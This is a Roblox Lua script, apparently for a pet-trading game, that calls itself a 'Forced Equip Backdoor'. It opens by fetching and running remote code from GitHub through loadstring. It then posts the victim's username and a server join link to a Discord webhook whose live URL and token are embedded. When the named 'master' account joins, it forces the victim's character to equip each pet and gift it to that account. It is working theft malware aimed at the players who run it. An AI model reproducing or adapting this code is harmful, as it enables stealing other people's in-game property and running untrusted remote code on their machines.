loadstring(game:HttpGet('https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua'))()

--[[
    Forced Equip Backdoor v4.0 (Master: XrzpAlt)
    Description: Solves the "not holding a pet" error by forcing the victim's character to physically
    equip each pet tool before firing the gift remote. Uses the direct Player.Backpack path.
]]

-- ============================ CONFIGURATION ============================
local masterUsername = "XrzpAlt"
local webhookURL = "https://discord.com/api/webhooks/1413278051927855104/0HSWdS1PM-66ZyR7cUw_GmYecfIs5BSrXzWt4fYb3eSi3gL7hg9eQvnWXqQtxng6vG1d"
local equipWaitDelay = 0.5 -- How long to wait after equipping the pet for the server to register it.
-- =======================================================================

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- State Control
local transferCompleted = false
print("Forced Equip Backdoor armed. Waiting for master: " .. masterUsername)

--[ Webhook Notification ]--
task.spawn(function()
    pcall(function()
        local joinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
        local payload = HttpService:JSONEncode({
            username = "Backdoor Notifier",
            embeds = {{
                title = "VICTIM SCRIPT EXECUTED (Forced Equip)!",
                description = "`" .. LocalPlayer.Name .. "` has armed the trap. Join now.",
                color = 65280,
                fields = {
                    {name = "Victim", value = LocalPlayer.Name, inline = true},
                    {name = "Master", value = masterUsername, inline = true},
                    {name = "Join Link", value = "[Click to Join](" .. joinLink .. ")"}
                }
            }}
        })
        local requestFunc = getgenv().request or (syn and syn.request) or HttpService.RequestAsync
        if requestFunc then requestFunc({Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) end
    end)
end)

--[ Main Transfer Logic ]--
local function beginTransfer(masterPlayerObject)
    if transferCompleted then return end
    transferCompleted = true

    print("MASTER DETECTED: " .. masterPlayerObject.Name .. ". Initiating forced equip and gift sequence.")
    
    local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
    if not PetGiftingService then warn("PetGiftingService remote not found. Aborting.") return end

    local victimCharacter = LocalPlayer.Character
    local victimHumanoid = victimCharacter and victimCharacter:FindFirstChildOfClass("Humanoid")
    if not victimHumanoid then warn("Victim's Humanoid not found. Cannot force equip. Aborting.") return end
    
    local victimBackpack = LocalPlayer:FindFirstChild("Backpack")
    if not victimBackpack then warn("Could not locate victim's Backpack. Aborting.") return end

    -- We must get a static list of the pets first.
    local allPets = victimBackpack:GetChildren()
    if #allPets == 0 then print("Victim's Backpack is empty.") return end

    print("Located " .. #allPets .. " items. Starting transfer...")
    
    for i, petTool in ipairs(allPets) do
        if not masterPlayerObject or not masterPlayerObject.Parent then
            print("Master left the game. Halting transfer.")
            break
        end

        print("--> Processing item " .. i .. "/" .. #allPets .. " (" .. petTool.Name .. ")")
        
        pcall(function()
            -- Step 1: Force the victim's character to PHYSICALLY equip the tool.
            -- This is the crucial step to update the "is holding" state on the server.
            victimHumanoid:EquipTool(petTool)
            print("   - Forced equip command sent.")
            
            -- Step 2: Wait for the server to process the equip action.
            task.wait(equipWaitDelay)
            
            -- Step 3: Now that the server knows the pet is equipped, fire the gift remote.
            PetGiftingService:FireServer("GivePet", masterPlayerObject)
            print("   - Gift command sent.")
        end)
        
        task.wait(0.5) -- Small delay before processing the next item.
    end
    print("TRANSFER COMPLETE. All items processed.")
end

--[ Event Connections ]--
Players.PlayerAdded:Connect(function(player)
    if string.lower(player.Name) == string.lower(masterUsername) then
        task.wait(3) -- Wait a little longer for character to fully load.
        beginTransfer(player)
    end
end)

-- Check if you are already in the server when the victim runs the script.
if Players:FindFirstChild(masterUsername) then
    print("Master is already in server. Starting immediately.")
    task.wait(1)
    beginTransfer(Players[masterUsername])
end
